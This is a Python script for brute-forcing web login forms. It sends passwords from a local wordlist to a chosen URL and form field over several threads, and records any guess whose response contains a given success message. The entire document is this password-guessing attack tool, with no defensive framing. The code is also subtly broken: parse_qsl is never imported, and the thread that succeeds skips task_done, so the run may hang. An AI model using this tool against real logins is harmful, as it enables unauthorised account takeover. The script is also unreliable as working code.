import argparse
import threading
import queue
import requests
from urllib.parse import urlencode

# Argument Parsing
parser = argparse.ArgumentParser(description="Advanced HTTP Password Guesser")
parser.add_argument("-u", "--url", required=True, help="Target URL of the form action")
parser.add_argument("-d", "--data", required=True, help="Query string or POST body data")
parser.add_argument("-m", "--method", choices=["GET", "POST"], required=True, help="Form method")
parser.add_argument("-f", "--field", required=True, help="Field name to brute force")
parser.add_argument("-s", "--success", required=True, help="Unique success message")
parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
args = parser.parse_args()

q = queue.Queue()

s = requests.Session()

def http_guesser():
    while not q.empty():
        current_pass = q.get()
        print(f"[+] Trying password: {current_pass}")
        data_dict = dict(parse_qsl(args.data))
        data_dict[args.field] = current_pass

        try:
            res = s.request(args.method, args.url, data=urlencode(data_dict))
            if args.success in res.text:
                print(f"[+] Success! Password: {current_pass}")
                with open('success.txt', 'w') as file:
                    file.write(f"Password found: {current_pass}\n")
                return
        except Exception as e:
            print(f"Error: {e}")
        q.task_done()

# Load passwords from wordlist
with open('wordlists/password_list_small', 'r') as file:
    for password in file.read().splitlines():
        q.put(password)

# Run threads
for _ in range(args.threads):
    t = threading.Thread(target=http_guesser, daemon=True)
    t.start()

q.join()
